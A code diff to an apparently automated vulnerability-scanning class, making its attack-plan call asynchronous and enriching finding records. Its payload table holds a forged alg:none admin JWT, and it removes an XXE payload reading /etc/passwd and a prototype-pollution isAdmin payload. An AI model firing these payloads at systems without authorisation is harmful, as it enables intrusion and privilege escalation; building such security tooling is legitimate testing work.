@@ -216,7 +216,7 @@ class ConcurrentHuntRunner:
                     ))
                 
                 available_classes = list(set(f.get("type", "").split("_")[0] for f in all_findings))
-                plan = self.attack_strategy.generate_attack_plan(signals, available_classes)
+                plan = await self.attack_strategy.generate_attack_plan(signals, available_classes)
                 
                 # If strategy recommends prioritization, log it
                 if plan.priority_classes:
@@ -593,12 +593,6 @@ class ConcurrentHuntRunner:
                 {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.", "header": "Authorization: Bearer"},
                 {"payload": "none", "header": "Authorization: Bearer"},
             ],
-            "xxe": [
-                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "method": "POST"},
-            ],
-            "prototype_pollution": [
-                {"payload": '{"__proto__": {"isAdmin": true}}', "method": "POST"},
-            ],
             "deserialization": [
                 {"payload": "rO0ABXNy...", "method": "POST"},
             ],
@@ -803,11 +797,14 @@ class ConcurrentHuntRunner:
 
         return {
             "type": vuln_class,
+            "vuln_class": vuln_class,
             "url": url,
             "endpoint": url,
             "param": param_name,
             "parameter": param_name,
             "payload": payload,
+            "payload_used": payload,
+            "injection_point": param_name,
             "severity": self._severity_for_class(vuln_class),
             "confidence": confidence,
             "cvss_score": cvss,
@@ -821,6 +818,7 @@ class ConcurrentHuntRunner:
             "evaluation_proof": evaluation_proof,
             "response_context": self._extract_context(body, evaluation_proof),
             "tested_url": url,
+            "reproduction_steps": f"Send payload '{payload}' to {url} parameter {param_name}",
         }
 
     def _extract_context(self, body: str, proof: str) -> str:
